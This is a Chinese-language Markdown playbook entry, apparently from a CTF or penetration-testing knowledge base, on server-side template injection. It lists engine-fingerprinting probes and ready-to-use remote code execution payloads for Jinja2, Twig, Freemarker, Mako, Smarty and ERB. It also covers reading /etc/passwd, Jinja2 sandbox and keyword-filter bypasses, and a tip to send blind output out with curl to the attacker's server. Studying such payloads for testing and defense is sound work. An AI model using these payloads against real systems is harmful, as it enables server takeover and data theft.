---
category: web
tags: [ssti, template_injection, jinja2, twig, freemarker, mako, smarty, 模板注入, server_side_template_injection]
triggers: [template injection, ssti, jinja2, twig, freemarker, mako, smarty, template, render, 模板注入, "{{", "${", "#{"]
related: [sqli, deserialization_pickle, xss, nosql_injection, prototype_pollution]
---

# 服务端模板注入 (SSTI)

## 什么时候用

用户输入被嵌入模板引擎渲染，而非作为纯文本输出。常见于自定义邮件模板、动态页面生成、报告生成等场景。

## 前提条件

- 用户输入被传给模板引擎渲染（不是简单的字符串拼接）
- 模板引擎没有开启沙箱，或沙箱可以绕过
- 需要识别具体的模板引擎类型

## 判断是否存在 SSTI

依次尝试，观察响应：

```
{{7*7}}     → 49    → Jinja2 / Twig / Nunjucks
${7*7}      → 49    → Freemarker / Mako / Velocity
#{7*7}      → 49    → Thymeleaf / EL
<%= 7*7 %>  → 49    → ERB (Ruby)
{7*7}       → 49    → Smarty
```

**区分 Jinja2 和 Twig**：
```
{{7*'7'}}
→ Jinja2: '7777777' (字符串乘法)
→ Twig: 49 (数字乘法)
```

## 攻击步骤（按引擎）

### Jinja2（Python，最常见）

核心链：通过 Python 的 `__subclasses__()` 遍历所有已加载类，找到能执行命令的类。

**标准 RCE payload**：
```jinja
{% for s in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in s.__name__ %}
    {{ s()._module.__builtins__['__import__']('os').popen('id').read() }}
  {% endif %}
{% endfor %}
```

**原理拆解**：
1. `().__class__` → `<class 'tuple'>`
2. `.__base__` → `<class 'object'>`（所有类的根）
3. `.__subclasses__()` → 所有已加载的子类列表
4. 找 `warnings.catch_warnings`（有 `_module` 属性）
5. `._module.__builtins__['__import__']('os')` → 导入 os
6. `.popen('cmd').read()` → 执行命令

**更短的 payload**（如果有字符限制）：
```jinja
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

```jinja
{{ request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**读文件**：
```jinja
{{ ().__class__.__base__.__subclasses__()[INDEX]('/etc/passwd').read() }}
```
其中 INDEX 是 `open` 类（`<class '_io.FileIO'>`）在 `__subclasses__()` 里的索引。

### Twig（PHP）

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

Twig 3.x：
```twig
{{['id']|filter('system')}}
```

### Freemarker（Java）

```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}
```

或利用 `ObjectConstructor`：
```freemarker
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"])?first().start()}
```

### Mako（Python）

```python
<%
import os
os.popen('id').read()
%>
```

### Smarty（PHP）

```smarty
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME, "<?php system('id'); ?>", self::clearConfig())}
```

### ERB（Ruby）

```erb
<%= system('id') %>
<%= `id` %>
```

## 沙箱绕过

### Jinja2 SandboxedEnvironment 绕过

如果用了 `SandboxedEnvironment`，以下方法可能有效：

```jinja
{# 利用 string 对象的 format_map #}
{{ "%s"|format(config) }}

{# 利用 attr 过滤器绕过属性访问限制 #}
{{ ()|attr("__class__")|attr("__base__")|attr("__subclasses__")() }}

{# 利用 request 对象 #}
{{ request['__class__'] }}
```

### 关键词被过滤

```jinja
{# 用 [] 替代 . 访问属性 #}
{{ ()["__class__"]["__base__"]["__subclasses__"]() }}

{# 用 | attr 过滤器 #}
{{ ()|attr("\x5f\x5fclass\x5f\x5f") }}

{# 拼接字符串绕过 #}
{% set a = "__cla" ~ "ss__" %}
{{ ()|attr(a) }}
```

## 常见坑

- **Jinja2 vs Twig 混淆**：两者语法相似但 payload 完全不同（Python vs PHP）
- **`__subclasses__()` 索引变化**：不同 Python 版本、不同导入的模块会导致索引不同，用循环遍历而非硬编码索引
- **SandboxedEnvironment**：`jinja2.SandboxedEnvironment` 会阻止大部分属性访问，需要绕过技巧
- **ImmutableSandboxedEnvironment**：比 Sandboxed 更严格，额外阻止了 `set`/`block`/`extends` 等标签
- **输出长度限制**：某些场景输出被截断，用 `| truncate(1000)` 或分段读取
- **无回显 SSTI**：考虑带外（OOB）——`curl` 把结果发到你的服务器

## SSTI 在 CTF 以外的真实场景

- **ML 模型元数据**：`.gguf` 模型文件的 `chat_template` 字段被 Jinja2 渲染（CVE-2024-34359, llama-cpp-python）
- **邮件模板**：后台可编辑的邮件模板（CVE-2024-45053, Fides）
- **CMS 模板编辑**：WordPress/Drupal 等 CMS 的主题编辑器

## 相关技术

- [[sqli]] — 如果输入被拼进 SQL 而非模板
- [[deserialization_pickle]] — Jinja2 SSTI 拿到 RCE 后的常见后续
- [[xss]] — 客户端模板注入（Angular/Vue template injection）
